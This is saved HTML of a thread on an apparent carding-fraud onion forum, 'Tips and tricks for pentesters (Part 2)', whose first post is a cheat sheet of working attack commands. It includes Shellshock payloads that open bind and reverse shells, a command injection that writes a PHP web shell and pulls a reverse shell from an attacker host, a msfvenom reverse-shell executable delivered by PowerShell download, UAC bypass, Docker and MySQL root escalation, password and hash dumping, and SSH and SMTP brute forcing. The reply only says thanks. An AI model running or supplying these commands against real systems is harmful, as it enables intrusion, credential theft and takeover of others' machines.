@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en-gb">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>Tips and tricks for pentesters (Part 2) - Best Carding World</title>
+
+	<link rel="alternate" type="application/atom+xml" title="Feed - Best Carding World" href="http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/feed.php">			<link rel="alternate" type="application/atom+xml" title="Feed - New Topics" href="http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/feed.php?mode=topics">		<link rel="alternate" type="application/atom+xml" title="Feed - Forum - Penetration Tests" href="http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/feed.php?f=43">	<link rel="alternate" type="application/atom+xml" title="Feed - Topic - Tips and tricks for pentesters (Part 2)" href="http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/feed.php?f=43&amp;t=636">	
+	<link rel="canonical" href="http://bestteermb42clir6ux7xm76d4jjodh3fpahjqgbddbmfrgp4skg2wqd.onion/viewtopic.php?t=636">
+
+<!--
+	phpBB style name: ne-blackgreen
+	Based on style:   prosilver (this is the default phpBB3 style)
+	Original author:  Tom Beddard ( http://www.subBlue.com/ )
+	Modified by: Bernhard ( http://www.nachtelb.de )
+-->
+
+
+<link href="./styles/prosilver/theme/common.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/links.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/content.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/buttons.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/cp.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/forms.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/colours.css?assets_version=6" rel="stylesheet">
+<link href="./styles/prosilver/theme/imageset.css?assets_version=6" rel="stylesheet"> 
+<link href="./styles/ne-blackgreen/theme/stylesheet.css?assets_version=6" rel="stylesheet" />
+<link href="./styles/prosilver/theme/responsive.css?assets_version=6" rel="stylesheet" media="all and (max-width: 700px)">
+
+
+<!--[if lte IE 9]>
+<link href="./styles/prosilver/theme/tweaks.css?assets_version=6" rel="stylesheet">
+<![endif]-->
+
+
+
+
+
+</head>
+<body id="phpbb" class="nojs notouch section-viewtopic ltr ">
+
+
+<div id="wrap">
+	<a id="top" class="anchor" accesskey="t"></a>
+	<div id="page-header">
+		<div class="headerbar" role="banner">
+			<div class="inner">
+
+			<div id="site-description">
+				<a id="logo" class="logo" href="./index.php" title="Home"><span class="imageset site_logo"></span></a>
+				<h1>Best Carding World</h1>
+				<p>Cardable Goods &amp; Money Transfers</p>
+				<p class="skiplink"><a href="#start_here">Skip to content</a></p>
+			</div>
+
+									<div id="search-box" class="search-box search-header" role="search">
+				<form action="./search.php" method="get" id="search">
+				<fieldset>
+					<input name="keywords" id="keywords" type="search" maxlength="128" title="Search for keywords" class="inputbox search tiny" size="20" value="" placeholder="Search…" />
+					<button class="button icon-button search-icon" type="submit" title="Search">Search</button>
+					<a href="./search.php" class="button icon-button search-adv-icon" title="Advanced search">Advanced search</a>
+					
+				</fieldset>
+				</form>
+			</div>
+			
+			</div>
+		</div>
+				<div class="navbar" role="navigation">
+	<div class="inner">
+
+	<ul id="nav-main" class="linklist bulletin" role="menubar">
+
+		<li id="quick-links" class="small-icon responsive-menu dropdown-container" data-skip-responsive="true">
+			<a href="#" class="responsive-menu-link dropdown-trigger">Quick links</a>
+			<div class="dropdown hidden">
+				<div class="pointer"><div class="pointer-inner"></div></div>
+				<ul class="dropdown-contents" role="menu">
+					
+											<li class="separator"></li>
+																								<li class="small-icon icon-search-unanswered"><a href="./search.php?search_id=unanswered" role="menuitem">Unanswered topics</a></li>
+						<li class="small-icon icon-search-active"><a href="./search.php?search_id=active_topics" role="menuitem">Active topics</a></li>
+						<li class="separator"></li>
+						<li class="small-icon icon-search"><a href="./search.php" role="menuitem">Search</a></li>
+					
+											<li class="separator"></li>
+												<li class="small-icon icon-team"><a href="./memberlist.php?mode=team" role="menuitem">The team</a></li>										<li class="separator"></li>
+
+									</ul>
+			</div>
+		</li>
+
+				<li class="small-icon icon-faq" data-skip-responsive="true"><a href="./faq.php" rel="help" title="Frequently Asked Questions" role="menuitem">FAQ</a></li>
+						
+			<li class="small-icon icon-logout rightside"  data-skip-responsive="true"><a href="./ucp.php?mode=login" title="Login" accesskey="x" role="menuitem">Login</a></li>
+					<li class="small-icon icon-register rightside" data-skip-responsive="true"><a href="./ucp.php?mode=register" role="menuitem">Register</a></li>
+						</ul>
+
+	<ul id="nav-breadcrumbs" class="linklist navlinks" role="menubar">
+						<li class="small-icon icon-home breadcrumbs">
+									<span class="crumb" itemtype="http://data-vocabulary.org/Breadcrumb" itemscope=""><a href="./index.php" accesskey="h" data-navbar-reference="index" itemprop="url"><span itemprop="title">Home</span></a></span>
+											<span class="crumb" itemtype="http://data-vocabulary.org/Breadcrumb" itemscope="" data-forum-id="42"><a href="./viewforum.php?f=42" itemprop="url"><span itemprop="title">Hackers Zone</span></a></span>
+															<span class="crumb" itemtype="http://data-vocabulary.org/Breadcrumb" itemscope="" data-forum-id="43"><a href="./viewforum.php?f=43" itemprop="url"><span itemprop="title">Penetration Tests</span></a></span>
+												</li>
+		
+					<li class="rightside responsive-search" style="display: none;"><a href="./search.php" title="View the advanced search options" role="menuitem">Search</a></li>
+			</ul>
+
+	</div>
+</div>
+	</div>
+
+	
+	<a id="start_here" class="anchor"></a>
+	<div id="page-body" role="main">
+		
+		
+<h2 class="topic-title"><a href="./viewtopic.php?f=43&amp;t=636">Tips and tricks for pentesters (Part 2)</a></h2>
+<!-- NOTE: remove the style="display: none" when you want to have the forum description on the topic body -->
+<div style="display: none !important;">Penetration testing<br /></div>
+
+
+<div class="action-bar top">
+
+	<div class="buttons">
+		
+			<a href="./posting.php?mode=reply&amp;f=43&amp;t=636" class="button icon-button reply-icon" title="Post a reply">
+			Post Reply		</a>
+	
+			</div>
+
+		<div class="dropdown-container dropdown-button-control topic-tools">
+		<span title="Topic tools" class="button icon-button tools-icon dropdown-trigger dropdown-select"></span>
+		<div class="dropdown hidden">
+			<div class="pointer"><div class="pointer-inner"></div></div>
+			<ul class="dropdown-contents">
+																								<li class="small-icon icon-print"><a href="./viewtopic.php?f=43&amp;t=636&amp;view=print" title="Print view" accesskey="p">Print view</a></li>							</ul>
+		</div>
+	</div>
+	
+			<div class="search-box" role="search">
+			<form method="get" id="topic-search" action="./search.php">
+			<fieldset>
+				<input class="inputbox search tiny"  type="search" name="keywords" id="search_keywords" size="20" placeholder="Search this topic…" />
+				<button class="button icon-button search-icon" type="submit" title="Search">Search</button>
+				<a href="./search.php" class="button icon-button search-adv-icon" title="Advanced search">Advanced search</a>
+				<input type="hidden" name="t" value="636" />
+<input type="hidden" name="sf" value="msgonly" />
+
+			</fieldset>
+			</form>
+		</div>
+	
+			<div class="pagination">
+			2 posts
+							&bull; Page <strong>1</strong> of <strong>1</strong>
+					</div>
+		</div>
+
+
+
+
+			<div id="p1456" class="post has-profile bg2">
+		<div class="inner">
+
+		<dl class="postprofile" id="profile1456">
+			<dt class="no-profile-rank has-avatar">
+				<div class="avatar-container">
+																<a href="./memberlist.php?mode=viewprofile&amp;u=179" class="avatar"><img class="avatar" src="./download/file.php?avatar=g2_1481306455.png" width="120" height="100" alt="User avatar" /></a>														</div>
+								<a href="./memberlist.php?mode=viewprofile&amp;u=179" style="color: #00BF00;" class="username-coloured">lazyaf</a>							</dt>
+
+									
+		<dd class="profile-posts"><strong>Posts:</strong> <a href="./search.php?author_id=179&amp;sr=posts">12</a></dd>		<dd class="profile-joined"><strong>Joined:</strong> Wed Oct 25, 2017 9:20 pm</dd>		
+		
+						
+						
+		</dl>
+
+		<div class="postbody">
+						<div id="post_content1456">
+
+						<h3 class="first"><a href="#p1456">Tips and tricks for pentesters (Part 2)</a></h3>
+
+													<ul class="post-buttons">
+																																									<li>
+							<a href="./posting.php?mode=quote&amp;f=43&amp;p=1456" title="Reply with quote" class="button icon-button quote-icon"><span>Quote</span></a>
+						</li>
+														</ul>
+							
+						<p class="author"><a href="./viewtopic.php?p=1456#p1456"><span class="imageset icon_post_target" title="Post">Post</span></a><span class="responsive-hide">by <strong><a href="./memberlist.php?mode=viewprofile&amp;u=179" style="color: #00BF00;" class="username-coloured">lazyaf</a></strong> &raquo; </span>Tue Aug 21, 2018 3:50 pm </p>
+			
+			
+			
+			<div class="content">Tor Nat Traversal<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># install to server<br />$ apt-get install tor torsocks<br /><br /># bind ssh to tor service port 80<br /># /etc/tor/torrc<br />SocksPolicy accept 127.0.0.1<br />SocksPolicy accept 192.168.0.0/16<br />Log notice file /var/log/tor/notices.log<br />RunAsDaemon 1<br />HiddenServiceDir /var/lib/tor/ssh_hidden_service/<br />HiddenServicePort 80 127.0.0.1:22<br />PublishServerDescriptor 0<br />$ /etc/init.d/tor start<br />$ cat /var/lib/tor/ssh_hidden_service/hostname<br />3l5zstvt1zk5jhl662.onion<br /><br /># ssh connect from client<br />$ apt-get install torsocks<br />$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80</code></div><br /><br />DNS brute forcing with fierce<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># http://ha.ckers.org/fierce/<br />$ ./fierce.pl -dns example.com<br />$ ./fierce.pl –dns example.com –wordlist myWordList.txt</code></div><br /><br />Metagoofil metadata gathering tool<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># http://www.edge-security.com/metagoofil.php<br />#automate search engine document retrieval and analysis. It also has the capability to provide MAC<br /># addresses, username listings, and more<br />$ python metagoofil.py -d example.com -t doc,pdf -l 200 -n 50 -o examplefiles -f results.html</code></div><br /><br />A best NMAP scan strategy<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># A best nmap scan strategy for networks of all sizes<br /><br /># Host Discovery - Generate Live Hosts List<br />$ nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24<br />$ grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d ' ' &gt; LiveHosts.txt<br /><br /># Port Discovery - Most Common Ports<br /># http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf<br />$ nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt<br />$ nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt<br />$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt<br /><br /># Port Discovery - Full Port Scans (UDP is very slow)<br />$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt<br />$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt<br /><br /># Print TCP\UDP Ports<br />$ grep &quot;open&quot; FullTCP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print &quot;T:&quot;$0}'<br />$ grep &quot;open&quot; FullUDP|cut -f 1 -d ' ' | sort -nu | cut -f 1 -d '/' |xargs | sed 's/ /,/g'|awk '{print &quot;U:&quot;$0}'<br /><br /># Detect Service Version<br />$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt<br /><br /># Operating System Scan<br />$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt<br /><br /># OS and Service Detect<br />$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</code></div><br /><br />Nmap – Techniques for Avoiding Firewalls<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># fragmentation<br />$ nmap -f<br /><br /># change default MTU size number must be a multiple of 8 (8,16,24,32 etc)<br />$ nmap --mtu 24<br /><br /># Generates a random number of decoys<br />$ nmap -D RND:10 &#91;target&#93;<br /><br /># Manually specify the IP addresses of the decoys<br />$ nmap -D decoy1,decoy2,decoy3 etc.<br /><br /># Idle Zombie Scan, first t need to find zombie ip<br />$ nmap -sI &#91;Zombie IP&#93; &#91;Target IP&#93;<br /><br /># Source port number specification<br />$ nmap --source-port 80 IP<br /><br /># Append Random Data to scan packages<br />$ nmap --data-length 25 IP<br /><br /># MAC Address Spoofing, generate different mac for host pc<br />$ nmap --spoof-mac Dell/Apple/3Com IP</code></div><br /><br />Exploit servers to Shellshock<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># A tool to find and exploit servers vulnerable to Shellshock<br /># https://github.com/nccgroup/shocker<br />$ ./shocker.py -H 192.168.56.118&nbsp; --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose<br /><br /># cat file<br />$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80<br /><br /># bind shell<br />$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80<br /><br /># reverse Shell<br />$ nc -l -p 443<br />$ echo &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</code></div><br /><br />Root with Docker<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># get root with docker<br /># user must be in docker group<br />ek@victum:~/docker-test$ id<br />uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)<br /><br />ek@victum:~$ mkdir docker-test<br />ek@victum:~$ cd docker-test<br /><br />ek@victum:~$ cat &gt; Dockerfile<br />FROM debian:wheezy<br /><br />ENV WORKDIR /stuff<br /><br />RUN mkdir -p $WORKDIR<br /><br />VOLUME &#91; $WORKDIR &#93;<br /><br />WORKDIR $WORKDIR<br />&lt;&lt; EOF<br /><br />ek@victum:~$ docker build -t my-docker-image .<br />ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \<br />'cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh'<br />./sh<br />whoami<br /># root<br /><br />ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat /stuff/shadow'</code></div><br /><br />Tunneling Over DNS to Bypass Firewall<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># Tunneling Data and Commands Over DNS to Bypass Firewalls<br /># dnscat2 supports &quot;download&quot; and &quot;upload&quot; commands for getting files (data and programs) to and from # the victim’s host.<br /><br /># server (attacker)<br />$ apt-get update<br />$ apt-get -y install ruby-dev git make g++<br />$ gem install bundler<br />$ git clone https://github.com/iagox86/dnscat2.git<br />$ cd dnscat2/server<br />$ bundle install<br />$ ruby ./dnscat2.rb<br />dnscat2&gt; New session established: 16059<br />dnscat2&gt; session -i 16059<br /><br /># client (victum)<br /># https://downloads.skullsecurity.org/dnscat2/<br /># https://github.com/lukebaggett/dnscat2-powershell<br />$ dnscat --host &lt;dnscat server_ip&gt;</code></div><br /><br />Compile Assemble code<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>$ nasm -f elf32 simple32.asm -o simple32.o<br />$ ld -m elf_i386 simple32.o simple32<br /><br />$ nasm -f elf64 simple.asm -o simple.o<br />$ ld simple.o -o simple</code></div><br /><br />Pivoting to Internal Network Via Non Interactive Shell<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># generate ssh key with shell<br />$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=whoami&quot;<br />$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \&quot;\&quot; &quot;<br />$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot;<br /><br /># add tempuser at attacker ps<br />$ useradd -m tempuser<br />$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh<br />$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot; &gt; /home/tempuser/.ssh/authorized_keys<br />$ chmod 700 /home/tempuser/.ssh/authorized_keys<br />$ chown -R tempuser:tempuser /home/tempuser/.ssh<br /><br /># create reverse ssh shell<br />$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&quot;</code></div><br /><br />Patator is a multi-purpose brute-forcer<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># git clone https://github.com/lanjelot/patator.git /usr/share/patator<br /><br /># SMTP bruteforce<br />$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst<br />$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst<br />$ patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst<br />$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name'</code></div><br /><br />Metasploit Web terminal via Gotty<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>$ service postgresql start<br />$ msfdb init<br />$ apt-get install golang<br />$ mkdir /root/gocode<br />$ export GOPATH=/root/gocode<br />$ go get github.com/yudai/gotty<br />$ gocode/bin/gotty -a 127.0.0.1 -w msfconsole<br /># open in browser http://127.0.0.1:8080</code></div><br /><br />Get full shell with POST RCE<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>attacker:~$ curl -i -s -k&nbsp; -X 'POST' --data-binary $'IP=%3Bwhoami&amp;submit=submit' 'http://victum.tk/command.php'<br /><br />attacker:~$ curl -i -s -k&nbsp; -X 'POST' --data-binary $'IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit' 'http://victum.tk/command.php'<br /><br />attacker:~$ curl http://victum.tk/shell.php?cmd=id<br /><br /># download reverse shell to server (phpshell.php)<br />http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27<br /><br /># run nc and execute phpshell.php<br />attacker:~$ nc -nvlp 1337</code></div><br /><br />Exiftool - Read and write meta information in files<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>$ wget http://www.sno.phy.queensu.ca/~phil/exiftool/Image-ExifTool-10.13.tar.gz<br />$ tar xzf Image-ExifTool-10.13.tar.gz<br />$ cd Image-ExifTool-10.13<br />$ perl Makefile.PL<br />$ make<br />$ ./exiftool main.gif</code></div><br /><br />Get SYSTEM with Admin reverse_shell on Win7<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &gt; danger.exe<br /><br />#show account settings<br />net user &lt;login&gt;<br /><br /># download psexec to kali<br />https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx<br /><br /># upload psexec.exe file onto the victim machine with powershell script<br />echo $client = New-Object System.Net.WebClient &gt; script.ps1<br />echo $targetlocation = &quot;http://192.168.56.102/PsExec.exe&quot; &gt;&gt; script.ps1<br />echo $client.DownloadFile($targetlocation,&quot;psexec.exe&quot;) &gt;&gt; script.ps1<br />powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1<br /><br /># upload danger.exe file onto the victim machine with powershell script<br />echo $client = New-Object System.Net.WebClient &gt; script2.ps1<br />echo $targetlocation = &quot;http://192.168.56.102/danger.exe&quot; &gt;&gt; script2.ps1<br />echo $client.DownloadFile($targetlocation,&quot;danger.exe&quot;) &gt;&gt; script2.ps1<br />powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1<br /><br /># UAC bypass from precompiled binaries:<br />https://github.com/hfiref0x/UACME<br /><br /># upload https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe to victim pc with powershell<br />echo $client = New-Object System.Net.WebClient &gt; script2.ps1<br />echo $targetlocation = &quot;http://192.168.56.102/Akagi64.exe&quot; &gt;&gt; script3.ps1<br />echo $client.DownloadFile($targetlocation,&quot;Akagi64.exe&quot;) &gt;&gt; script3.ps1<br />powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1<br /><br /># create listener on kali<br />nc -lvp 4444<br /><br /># Use Akagi64 to run the danger.exe file with SYSTEM privileges<br />Akagi64.exe 1 C:\Users\User\Desktop\danger.exe<br /><br /># create listener on kali<br />nc -lvp 4444<br /><br /># The above step should give us a reverse shell with elevated privileges<br /># Use PsExec to run the danger.exe file with SYSTEM privileges<br />psexec.exe –i –d –accepteula –s danger.exe</code></div><br /><br />Get SYSTEM with Standard user reverse_shell on Win7<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051<br />https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html<br />https://www.exploit-db.com/exploits/37049/<br /><br /># check the list of patches applied on the target machine<br /># to get the list of Hotfixes installed, type in the following command.<br />wmic qfe get<br />wmic qfe | find &quot;3057191&quot;<br /><br /># Upload compile exploit to victim machine and run it<br />https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe<br /><br /># by default exploite exec cmd.exe with SYSTEM privileges, we need to change source code to run danger.exe<br /># https://github.com/hfiref0x/CVE-2015-1701 download it and navigate to the file &quot;main.c&quot;<br /><br /># dump clear text password of the currently logged in user using wce.exe<br />http://www.ampliasecurity.com/research/windows-credentials-editor/<br />wce -w<br /><br /># dump hashes of other users with pwdump7<br />http://www.heise.de/download/pwdump.html<br /># we can try online hash cracking tools such crackstation.net</code></div><br /><br />Generate our own dic file based on the website content<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>$ cewl -m 4 -w dict.txt http://site.url<br />$ john --wordlist=dict.txt --rules --stdout</code></div><br /><br />Bruteforce DNS records using Nmap<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>$ nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads=6,dns-brute.hostlist=./hostfile.txt,newtargets -sS -p 80<br />$ nmap --script dns-brute www.foo.com</code></div><br /><br />Identifying a WAF with Nmap<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>$ nmap -p 80,443 --script=http-waf-detect 192.168.56.102<br />$ nmap -p 80,443 --script=http-waf-fingerprint 192.168.56.102<br />$ wafw00f www.example.com</code></div><br /><br />MS08-067 - without the use of Metasploit<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205<br />$ searchsploit ms08-067<br />$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1</code></div><br /><br />Nikto scan with SQUID proxy<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>$ nikto -useproxy http://squid_ip:3128 -h http://target_ip</code></div><br /><br />Hijack a binary’s full path in bash to exec your own code<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>$ function /usr/bin/foo () { /usr/bin/echo &quot;It works&quot;; }<br />$ export -f /usr/bin/foo<br />$ /usr/bin/foo<br />It works</code></div><br /><br />Local privilege escalation through MySQL run with root privileges<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)<br />$ wget 0xdeadbeef.info/exploits/raptor_udf2.c<br />$ gcc -g -c raptor_udf2.c<br />$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br />mysql -u root -p<br />mysql&gt; use mysql;<br />mysql&gt; create table foo(line blob);<br />mysql&gt; insert into foo values(load_file('/home/user/raptor_udf2.so'));<br />mysql&gt; select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';<br />mysql&gt; create function do_system returns integer soname 'raptor_udf2.so';<br />mysql&gt; select * from mysql.func;<br />mysql&gt; select do_system('echo &quot;root:passwd&quot; | chpasswd &gt; /tmp/out; chown user:user /tmp/out');<br /><br />user:~$ su -<br />Password:<br />user:~# whoami<br />root<br />root:~# id<br />uid=0(root) gid=0(root) groups=0(root)</code></div><br /><br />Bruteforce SSH login with patator<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>root:~# patator ssh_login host=192.168.0.18 user=FILE0 password=FILE1 0=word.txt 1=word.txt -x ignore:mesg='Authentication failed.'</code></div><br /><br />Using LD_PRELOAD to inject features to programs<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code>$ wget https://github.com/jivoi/pentest/ldpreload_shell.c<br />$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so<br />$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft</code></div><br /><br />Exploit the OpenSSH User Enumeration Timing Attack<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># https://github.com/c0r3dump3d/osueta<br />$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes<br />$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt</code></div><br /><br />Create a TCP circuit through validly formed HTTP requests with ReDuh<br /><div class="codebox"><p>Code: <a href="#" onclick="selectCode(this); return false;">Select all</a></p><code># https://github.com/sensepost/reDuh<br /><br /># step 1<br /># upload reDuh.jsp to victim server<br />$ http://192.168.10.50/uploads/reDuh.jsp<br /><br /># step 2<br /># run reDuhClient on attacker<br />$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp<br /><br /># step 3<br /># connecting to management port with nc<br />$ nc -nvv 127.0.0.1 1010<br /><br /># step 4<br /># forward localport to remote port with tunnel<br />&#91;createTunnel&#93; 7777:172.16.0.4:3389<br /><br /># step 5<br /># connect to localhost with rdp<br />$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777</code></div></div>
+
+			
+									
+									
+						</div>
+
+		</div>
+
+				<div class="back2top"><a href="#top" class="top" title="Top">Top</a></div>
+		
+		</div>
+	</div>
+
+	<hr class="divider" />
+				<div id="p1478" class="post has-profile bg1">
+		<div class="inner">
+
+		<dl class="postprofile" id="profile1478">
+			<dt class="no-profile-rank has-avatar">
+				<div class="avatar-container">
+																<a href="./memberlist.php?mode=viewprofile&amp;u=972" class="avatar"><img class="avatar" src="./download/file.php?avatar=g2_1481306455.png" width="120" height="100" alt="User avatar" /></a>														</div>
+								<a href="./memberlist.php?mode=viewprofile&amp;u=972" style="color: #00BF00;" class="username-coloured">KissOfDeath</a>							</dt>
+
+									
+		<dd class="profile-posts"><strong>Posts:</strong> <a href="./search.php?author_id=972&amp;sr=posts">5</a></dd>		<dd class="profile-joined"><strong>Joined:</strong> Fri Aug 03, 2018 9:11 am</dd>		
+		
+						
+						
+		</dl>
+
+		<div class="postbody">
+						<div id="post_content1478">
+
+						<h3 ><a href="#p1478">Re: Tips and tricks for pentesters (Part 2)</a></h3>
+
+													<ul class="post-buttons">
+																																									<li>
+							<a href="./posting.php?mode=quote&amp;f=43&amp;p=1478" title="Reply with quote" class="button icon-button quote-icon"><span>Quote</span></a>
+						</li>
+														</ul>
+							
+						<p class="author"><a href="./viewtopic.php?p=1478#p1478"><span class="imageset icon_post_target" title="Post">Post</span></a><span class="responsive-hide">by <strong><a href="./memberlist.php?mode=viewprofile&amp;u=972" style="color: #00BF00;" class="username-coloured">KissOfDeath</a></strong> &raquo; </span>Wed Aug 22, 2018 6:41 am </p>
+			
+			
+			
+			<div class="content">Gr8 tips <br />Thx</div>
+
+			
+									
+									
+						</div>
+
+		</div>
+
+				<div class="back2top"><a href="#top" class="top" title="Top">Top</a></div>
+		
+		</div>
+	</div>
+
+	<hr class="divider" />
+	
+
+	<form id="viewtopic" method="post" action="./viewtopic.php?f=43&amp;t=636">
+	<fieldset class="display-options" style="margin-top: 0; ">
+				<label>Display posts from previous: <select name="st" id="st"><option value="0" selected="selected">All posts</option><option value="1">1 day</option><option value="7">7 days</option><option value="14">2 weeks</option><option value="30">1 month</option><option value="90">3 months</option><option value="180">6 months</option><option value="365">1 year</option></select></label>
